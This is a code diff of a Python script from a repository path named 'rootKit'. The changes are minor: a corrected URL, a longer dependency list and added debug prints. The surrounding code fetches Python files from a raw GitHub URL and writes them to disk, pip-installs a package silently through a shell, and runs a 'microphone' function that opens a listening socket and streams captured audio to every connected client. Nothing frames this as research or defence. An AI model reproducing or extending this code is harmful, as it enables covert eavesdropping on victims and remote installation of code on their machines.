@@ -1,4 +1,4 @@
-listFileDepency = ['scripter.pyw']
+listFileDepency = ['fct.py', 'scripter.py', 'sound.py']
 hideFile = ["__pycache__"]
 githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
 
@@ -8,7 +8,6 @@ try:
     import easyimporting
 except:
     subprocess.Popen("py -m pip install easyimporting", shell=True)
-    import easyimporting
 
 try:
     from file import File
@@ -16,7 +15,7 @@ except:
     with open("file.py", 'w'):
             pass
     with open("file.py", "a") as file:
-        for line in requests.get(f"{githubUrl}").text.split('\n'):
+        for line in requests.get(f"{githubUrl}file.py").text.split('\n'):
             file.write(line)
     from file import File
 
@@ -55,6 +54,7 @@ def microphone(port, ip):
     serversocket.bind((ip, port))
     serversocket.listen(1)
     print('socket listen')
+    print(port, ip)
     def callback(in_data, frame_count, time_info, status):
         for s in read_list[1:]:
             s.send(in_data)
@@ -74,7 +74,8 @@ def microphone(port, ip):
                         data = s.recv(1024)
                         if not data:
                             read_list.remove(s)
-        except:
+        except Exception as e:
+            print(e)
             pass
         print('mic stop')
         serversocket.close()
@@ -199,6 +200,7 @@ run, progrun = True, True
 timeoutKill = 2000
 
 while True:
+    print("ready")
     BREAK = False
     run = True
     try:
